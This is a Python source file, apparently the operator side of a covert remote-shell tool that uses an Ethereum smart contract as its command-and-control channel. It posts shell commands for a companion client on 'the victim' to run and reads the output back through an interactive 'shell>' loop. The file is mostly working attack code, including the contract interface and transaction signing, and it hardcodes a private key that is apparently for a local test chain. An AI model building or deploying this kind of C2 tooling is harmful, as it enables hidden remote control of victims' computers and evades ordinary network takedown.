## Name        : RBCS_Server.py
## Date        : 5.3.2022
## Author      : Shakedash
## Description : This program will create a connection to a smartcontract to interact with the victim.
##               This program will can upload commands to the blockchain and get the output as well.
##               The commands will be executed using "RBCS_Client.py" and will send the output straight to the blockchain.

# Imports.
from web3 import Web3
import time

from RBCS_Client import W3_ENGINE

# Constants.
SOLIDITY_VERSION = "0.6.0"
ASCII_ART = '''
   ___     ___     ___     ___   
  | _ \   | _ )   / __|   / __|  
  |   /   | _ \  | (__    \__ \  
  |_|_\   |___/   \___|   |___/  
_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
'''
CONTRACT_ABI = [
    {"inputs": [], "stateMutability": "nonpayable", "type": "constructor"},
    {
        "inputs": [],
        "name": "GetCommand",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetOutput",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetisCommandReady",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetisOutputReady",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "Reset",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "string", "name": "command_", "type": "string"}],
        "name": "SetCommand",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "string", "name": "output_", "type": "string"}],
        "name": "SetOutput",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
]
RPC_URL = "HTTP://127.0.0.1:7545"
CHAIN_ID = 1337
CONTRACT_ADDR = "0x3Dd7b24DCa173668b68794195b085f3751755856"
ACCOUNT_ADDR = "0x6094A92Db36BCb533a40357b0E4274dE624AAea6"
PRIVATE_KEY = "0xed9754ec971cf055a38b847a2f7ed4bb4033c46477b573fe31f8563c465632f3"
W3_ENGINE = Web3(Web3.HTTPProvider(RPC_URL))  # Initialize the web3 provider object.
CNC_CONTRACT = W3_ENGINE.eth.contract(
    CONTRACT_ADDR, abi=CONTRACT_ABI
)  # Get contract object

# Main
def main():
    print(ASCII_ART)
    command = ""

    # Reset the blockchain (in case there was a previous execution of the program).
    ResetBlockChain()
    print("Waiting for a connection from the client")

    # While the attacker didn't choose to stop.
    while command != "exit":

        # Wait for a connection to the client\wait for the client to send command output.
        while not CNC_CONTRACT.functions.GetisOutputReady().call():
            time.sleep(0.1)

        # Get command output.
        command = input(f"{CNC_CONTRACT.functions.GetOutput().call()}\nshell>")

        # Send command and set isCommandReady to true.
        SendCommand(command)


# SendCommand() executes a transaction to set command variable.
def SendCommand(command):
    return RunTransaction(
        "SetCommand",
        [command],
    )


# SendCommand() executes a transaction to set command variable.
def ResetBlockChain():
    return RunTransaction(
        "Reset",
        [],
    )


# RunTransaction runs a transaction on the blockchain.
# Gets from address, private key, contract object, function name (in string), amount of eth to transfer, argv (to pass arguments to the function).
def RunTransaction(
    function_name,  # Function name in the smart contract.
    argv=[],  # For passing arguments to the function called.
):
    gasPrice = W3_ENGINE.eth.gas_price
    success = False

    # Fail safe.
    while not success:
        try:
            transaction = W3_ENGINE.eth.send_raw_transaction(
                W3_ENGINE.eth.account.sign_transaction(
                    getattr(CNC_CONTRACT.functions, function_name)(
                        *argv
                    ).buildTransaction(
                        {
                            "gasPrice": gasPrice,
                            "chainId": CHAIN_ID,
                            "from": ACCOUNT_ADDR,
                            "nonce": W3_ENGINE.eth.getTransactionCount(ACCOUNT_ADDR),
                            "value": 0,
                        }
                    ),
                    PRIVATE_KEY,
                ).rawTransaction
            )
            return transaction, W3_ENGINE.eth.wait_for_transaction_receipt(transaction)
            success = True
        except:
            pass


if __name__ == "__main__":
    main()
